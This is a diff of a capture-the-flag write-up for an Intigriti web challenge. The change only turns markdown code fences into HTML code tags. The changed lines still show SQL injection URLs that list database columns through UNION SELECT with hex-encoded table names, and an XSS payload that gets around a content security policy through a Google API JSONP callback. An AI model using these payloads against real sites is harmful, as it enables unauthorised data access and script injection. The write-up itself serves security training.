@@ -65,14 +65,15 @@ Query used : https://challenge-0722.intigriti.io/challenge/challenge.php?month=1
 
 <p>• The above is the structure database > tables > column </p>
 
-```
-Queries Used:
+
+<code>
+ Queries Used:
 https://challenge-0722.intigriti.io/challenge/challenge.php?month=1 union select null,column_name,null,null,null from information_schema.columns where table_name=0x75736572-- -
 
 https://challenge-0722.intigriti.io/challenge/challenge.php?month=1 union select null,column_name,null,null,null from information_schema.columns where table_name=0x706f7374-- -
 
 https://challenge-0722.intigriti.io/challenge/challenge.php?month=1 union select null,column_name,null,null,null from information_schema.columns where table_name=0x796f7574756265-- -
-```
+</code>
 
 <p>• Note : I hex encoded the values of table name since the query escapes any special characters and throws error.</p>
 
@@ -212,9 +213,9 @@ Query Used:
 
 <p>• Then i found the working endpoint on https://brutelogic.com.br/blog/csp-bypass-guidelines/</p>
 
-```
+<code>
 <Script Src=https://www.googleapis.com/customsearch/v1?callback=alert(document.domain)></Script>
-```
+</code>
 
 <p>• Now time to frame the query !</p>
 
